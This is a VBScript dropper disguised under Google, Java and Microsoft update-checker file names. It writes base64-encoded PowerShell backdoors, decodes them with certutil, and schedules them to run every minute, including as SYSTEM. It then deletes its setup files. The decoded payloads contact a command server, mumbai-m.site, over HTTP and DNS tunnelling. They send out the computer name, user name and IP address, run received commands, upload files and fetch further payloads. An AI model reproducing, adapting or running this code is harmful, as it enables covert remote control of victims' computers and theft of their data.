Dim oFSO
Dim oShell
Set oShell = WScript.CreateObject ("WScript.Shell")
Set oFSO = CreateObject("Scripting.FileSystemObject")
Dim objFso
Set objFso = WScript.CreateObject("Scripting.FileSystemObject")
If Not objFso.FolderExists("C:\ProgramData\Windows") Then
  objFso.CreateFolder "C:\ProgramData\Windows"
End If
If Not objFso.FolderExists("C:\ProgramData\Windows\Microsoft") Then
  objFso.CreateFolder "C:\ProgramData\Windows\Microsoft"
End If
If Not objFso.FolderExists("C:\ProgramData\Windows\Microsoft\java") Then
  objFso.CreateFolder "C:\ProgramData\Windows\Microsoft\java"
End If 
if Not objFso.FileExists("C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs") Then
	outFile = "C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs"
	Set objFile = objFSO.CreateTextFile(outFile,True)
	objFile.Write "set Shell0 = CreateObject(""wscript.shell"")" & vbCrLf & "Shell0.run ""powershell.exe -exec bypass -file C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.ps1 "", 0, false" & vbCrLf & "command1 = ""Powershell.exe -exec bypass -file C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.ps1""" & vbCrLf & "set Shell1 = CreateObject(""wscript.shell"")" & vbCrLf & "shell1.run command1, 0, false" 
	objFile.Close
End If
if Not objFso.FileExists("C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.base") Then
	code2 = "JHtnbG9iYWw6JHdjfSA9IG5ldy1vYmplY3Qgc3lzdGVtLm5ldC5XZWJDbGllbnQNCiR7Z2xvYmFsOiR3Y30ucHJveHkgPSBbU3lzdGVtLk5ldC5XZWJQcm94eV06OkdldERlZmF1bHRQcm94eSgpDQokc3J2ciA9ICJodHRwOi8vIiArIFtTeXN0ZW0uTmV0LkRuc106OkdldEhvc3RBZGRyZXNzZXMoInd3dy5tdW1iYWktbS5zaXRlIikgKyIvdXBkYXRlX3dhcHAyLmFzcHgiDQokaXAgPSBHZXQtV21pT2JqZWN0IC1xdWVyeSAic2VsZWN0ICogZnJvbSBXaW4zMl9OZXR3b3JrQWRhcHRlckNvbmZpZ3VyYXRpb24gd2hlcmUgSVBFbmFibGVkID0gJHRydWUiIHwgJXskXy5JUGFkZHJlc3N9DQoke2dsb2JhbDokYWlkfSA9IGdldC13bWlvYmplY3QgV2luMzJfQ29tcHV0ZXJTeXN0ZW1Qcm9kdWN0ICB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IFVVSUQgfCAleyRfLnJlcGxhY2UoJy0nLCcnKX0gfCAleyRfICsgIjEyNDUyNDEzNjUyMSJ9IHwgJXskXy5zdWJzdHJpbmcoMCwxMil9DQoke2dsb2JhbDokclBhdGh9ID0gJGVudjpQcm9ncmFtRGF0YSArICJcV2luZG93c1xNaWNyb3NvZnRcSmF2YVwiICsgJHtnbG9iYWw6JGFpZH0NCiR1cFBhdGggPSAkZW52OlByb2dyYW1EYXRhICsgIlxXaW5kb3dzXE1pY3Jvc29mdFxKYXZhXGZpbGVzXCI7DQpmdW5jdGlvbiBzbmRyKCRmbmFtZSwgJGNudCl7DQoJJGFkciA9IGFkckN0ICIkZm5hbWUiICIyIg0KCXdyaXRlLWhvc3QgJGFkcg0KCXdyaXRlLWhvc3QgJGNudA0KCSR7Z2xvYmFsOiR3Y30uVXBsb2FkU3RyaW5nKCRhZHIsIFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkRlZmF1bHQuR2V0Qnl0ZXMoJGNudCkpKQ0KfQ0KZnVuY3Rpb24gYWRyQ3QoJHJpZEluLCAkYWMpew0KCSRjciA9IEAoKQ0KCSRkYXIgPSBAKCkNCgkkZGFyID0gLWpvaW4gKEdldC1SYW5kb20gLUlucHV0T2JqZWN0ICgwIC4uIDkpIC1Db3VudCAxNSkNCgkkY3IgPSBHZXQtUmFuZG9tIC1JbnB1dE9iamVjdCAoMCAuLiA5KSAtQ291bnQgMg0KCSRkYXIgPSAkZGFyLkluc2VydCgkY3JbMF0sICRyaWRJbi5UcmltKCkpLkluc2VydCgoJGNyWzFdKSwgJHtnbG9iYWw6JGFpZH0pDQoJJGFkciA9ICIkKCRzcnZyKT92ZXJzaW9uPSQoJGRhcik1JCgkYWMpNyQoJGNyWzBdKSQoJGNyWzFdKSINCglyZXR1cm4gJGFkcg0KfQ0KaWYgKC1ub3QgKFRlc3QtUGF0aCAtUGF0aCAke2dsb2JhbDokclBhdGh9KSkNCnsNCglOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICR7Z2xvYmFsOiRyUGF0aH07DQoJc25kciAnMTIxMjEyMTIxMjEnICIkKCRlbnY6Q09NUFVURVJOQU1FKS8kKCRlbnY6VVNFUk5BTUUpPD4kKCRpcCkiOw0KfQ0KJGFkciA9IGFkckN0ICIyNDM1MTI0MzUxMCIgIjAiDQokcmlkID0gJHtnbG9iYWw6JHdjfS5Eb3dubG9hZFN0cmluZygkYWRyKQ0KaWYgKCRyaWQpew0KCWlmICgkcmlkLmxlbmd0aCAtZXEgMTEpew0KCQkkYWRyID0gYWRyQ3QgIiRyaWQiICIxIg0KCQkkciA9ICR7Z2xvYmFsOiR3Y30uRG93bmxvYWRTdHJpbmcoJGFkcikNCgkJJHJjbnQgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpEZWZhdWx0LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRyKSkNCgkJJGFkciA9IGFkckN0ICIkcmlkIiAiMyINCgkJJHtnbG9iYWw6JHdjfS5Eb3dubG9hZFN0cmluZygkYWRyKQ0KCQlpZigtbm90KFRlc3QtUGF0aCAkdXBQYXRoKSkge21kICR1cFBhdGg7fQ0KCQlpZiAoJHJpZC5FbmRzV2l0aCgiMCIpKXsNCgkJCSRyY250ID0gJHJjbnQgfCA/IHsgJF8udHJpbSgpIC1uZSAiIiB9DQoJCQkkcmVzICs9ICRyY250LlNwbGl0KCImIikgfCBmb3JlYWNoLW9iamVjdCB7ICRfIHwgaWV4IHwgT3V0LVN0cmluZyB9DQoJCQlzbmRyICRyaWQgJHJlcw0KCQl9DQoJCWVsc2VpZiAoJHJpZC5FbmRzV2l0aCgiMSIpKXsNCgkJCSRhZHIgPSAkcmNudC5UcmltKCkNCgkJCWlmIChUZXN0LVBhdGggLVBhdGggJGFkcikNCgkJCXsNCgkJCQkkYWRyUyA9IGFkckN0ICIkcmlkIiAiNCINCgkJCQkke2dsb2JhbDokd2N9LlVwbG9hZEZpbGUoJGFkclMsICRhZHIpDQoJCQl9DQoJCQllbHNlDQoJCQl7DQoJCQkJc25kciAkcmlkICI0MDQiDQoJCQl9DQoJCX0NCgkJZWxzZWlmICgkcmlkLkVuZHNXaXRoKCIyIikpew0KCQkJJHNhdkFkciA9ICR1cFBhdGgrJHJjbnQudHJpbSgpOw0KCQkJJGFkclMgPSBhZHJDdCAiJHJpZCIgIjUiDQoJCQkke2dsb2JhbDokd2N9LkRvd25sb2FkRmlsZSgkYWRyUywgJHNhdkFkcikNCgkJCXNuZHIgJHJpZCAiMjAwPD4kc2F2QWRyIg0KCQl9DQoJfQ0KfQ=="
	outFile2 = "C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.base"
	Set objFile2 = objFSO.CreateTextFile(outFile2,True)
	objFile2.Write  code2
	objFile2.Close
End If
if Not objFso.FileExists("C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.base") Then
	code3="JGRvbT0ibXVtYmFpLW0uc2l0ZSI7JHc9d2hvYW1pOw0KJGFpZD1nZXQtd21pb2JqZWN0IFdpbjMyX0NvbXB1dGVyU3lzdGVtUHJvZHVjdCAgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBVVUlEIHwgJXskXy5yZXBsYWNlKCctJywnJyl9IHwgJXskXyArICIxMjAxMjAwMTEyMjQifSB8ICV7JF8uc3Vic3RyaW5nKDAsMTIpfTskc3AgPSAkZW52OlRFTVA7DQokc20gPSAkZmFsc2U7JGN0ID0gMDskZmIgPSBAKCk7JHJuID0gIjAwMCI7JGFjID0gIjAiOyRydW4gPSAkdHJ1ZTskZWM9MDsNCldoaWxlICgkcnVuKXtTdGFydC1TbGVlcCAtbSAyMDA7DQppZigkZWMgLWdlIDUpe2JyZWFrfQ0KaWYgKCRjdCAtbHQgMTApIHsgJHJuID0gIjAwJCgkY3QpIjsgfWVsc2VpZiAoJGN0IC1sdCAxMDApIHsgJHJuID0gIjAkKCRjdCkiOyB9ZWxzZSB7ICRybiA9ICIkKCRjdCkiOyB9DQokcm5kID0gLWpvaW4gKEdldC1SYW5kb20gLUlucHV0T2JqZWN0ICgxMC4uOTkpIC1Db3VudCAoJXsgR2V0LVJhbmRvbSAtSW5wdXRPYmplY3QgKDEuLjYpfSkpOw0KdHJ5eyRsYT0gIiQoJHJuZCkkKCRhYykkKCRybikkKCRhaWQpQjAwNy4kKCRkb20pIjsNCiRydCA9IFtTeXN0ZW0uTmV0LkRuc106OkdldEhvc3RBZGRyZXNzZXMoJGxhKTt9Y2F0Y2h7JGVjKys7Y29udGludWU7fQ0KJHJzdSA9ICRydFswXS5JUEFkZHJlc3NUb1N0cmluZzskcnMgPSAkcnN1LlNwbGl0KCcuJyk7DQppZiAoKCRyc1swXSAtZXEgMSkgLWFuZCAoJHJzWzFdIC1lcSAyKSAtYW5kICgkcnNbMl0gLWVxIDMpKXskc20gPSAkZmFsc2U7JGFjID0gIjAiOw0KJGxlID0gJGZiLkxlbmd0aDtpZiAoJGZiWyRsZW4tMV0gLWVxIDAgLWFuZCAkZmJbJGxlbi0yXSAtZXEgMCkNCnskZmJ0ID0gJGZiWzAgLi4gKCRsZSAtIDMpXTt9ZWxzZWlmICgkZmJbJGxlIC0gMV0gLWVxIDApeyRmYnQgPSAkZmJbMCAuLiAoJGxlIC0gMildO31lbHNleyRmYnQgPSAkZmI7fQ0KW1N5c3RlbS5JTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygkc3AsICRmYnQpOyRmYiA9IEAoKTskY3QgPSAwO2JyZWFrO30NCmlmICgkc20pe2lmICgkY3QgLWd0IDI1MCkgeyRjdCA9IDA7fQ0KaWYgKCRjdCAtZXEgJHJzWzNdKXskZmIgKz0gJHJzWzBdOyRmYiArPSAkcnNbMV07JGZiICs9ICRyc1syXTskY3QgPSAkY3QgKyAzO319DQppZiAoKCRyc1swXSAtZXEgMjQpIC1hbmQgKCRyc1sxXSAtZXEgMTI1KSl7JHNwICs9ICJcIiArICRyc1syXSArICIiICsgJHJzWzNdOyRzbSA9ICR0cnVlOyRhYyA9ICIxIjskY3QgPSAwO30NCmlmICgoJHJzWzBdIC1lcSAxMSkgLWFuZCAoJHJzWzFdIC1lcSAyNCkgLWFuZCAoJHJzWzJdIC1lcSAyMzcpIC1hbmQgKCRyc1szXSAtZXEgMTEwKSkgeyRydW49JGZhbHNlO2JyZWFrO319DQppZiAoKEdldC1JdGVtICRzcCkubGVuZ3RoIC1ndCAwa2Ipew0KCWlmICgkc3AuRW5kc1dpdGgoIjAiKSl7DQoJCSRmYyA9IEdldC1Db250ZW50ICRzcCB8ID8geyAkXy50cmltKCkgLW5lICIiIH07DQoJCSRyZSArPSAkZmMuU3BsaXQoIiYiKSB8IGZvcmVhY2gtb2JqZWN0IHsgJF8gfCBpZXggfCBPdXQtU3RyaW5nIH19DQoJZWxzZWlmICgkc3AuRW5kc1dpdGgoIjEiKSl7TW92ZS1JdGVtIC1wYXRoICRzcCAtZGVzdGluYXRpb24gKCRzcCsiLnBzMSIpIC1Gb3JjZTt9DQoJZWxzZWlmICgkc3AuRW5kc1dpdGgoIjIiKSl7TW92ZS1JdGVtIC1wYXRoICRzcCAtZGVzdGluYXRpb24gKCRzcCsiLnZicyIpIC1Gb3JjZTt9DQp9DQokcmQgPSAtam9pbiAoR2V0LVJhbmRvbSAtSW5wdXRPYmplY3QgKDEwLi45OSkgLUNvdW50ICgleyBHZXQtUmFuZG9tIC1JbnB1dE9iamVjdCAoNS4uMTApfSkpOyRybiA9ICIwMDAiOw0KJHc9JHcrKCIqIioyNSl8JXskXy5zdWJzdHJpbmcoMCwyNSl9Ow0KJHc9W1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbc3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCR3KSkuUmVwbGFjZSgiLSIsICIiKTsNCnRyeXskYWQ9IiQoJHJkKTQkKCRybikkKCRhaWQpQjAwNy4kKCR3KS4kKCRkb20pIjsNCiRydCA9IFtTeXN0ZW0uTmV0LkRuc106OkdldEhvc3RBZGRyZXNzZXMoJGFkKTt9Y2F0Y2h7JGVjKys7Y29udGludWU7fQ=="
	outFile3 = "C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.base"
	Set objFile3 = objFSO.CreateTextFile(outFile3,True)
	objFile3.Write  code3
	objFile3.Close
End if
if Not objFso.FileExists("C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat") Then
		code4="@schtasks /create /F /sc minute /mo 1 /tn ""\UpdateTasks\JavaUpdates"" /tr ""wscript /b ""C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs""""NEXTLINE@schtasks /create /F /sc minute /RU ""SYSTEM"" /mo 1 /tn ""\UpdateTasks\JavaUpdates"" /tr ""wscript /b ""C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs"""""
		code4 = Replace(code4, "NEXTLINE", vbCrLf)
		outFile4 = "C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat"
		Set objFile4 = objFSO.CreateTextFile(outFile4,True)
		objFile4.Write  code4
		objFile4.Close
		oShell.run "cmd.exe /C certutil -f  -decode C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.base C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.ps1", 0,false
		oShell.run "cmd.exe /C certutil -f  -decode C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.base C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.ps1", 0,false
		oShell.run "cmd.exe /C C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat", 0,false
		oShell.run "cmd.exe /C wscript  /b C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs", 0,false
		WScript.Sleep(5000)
		oShell.run "cmd.exe /C del C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat", 0,false		
		oShell.run "cmd.exe /C del C:\ProgramData\Windows\Microsoft\java\*.base", 0,false
End If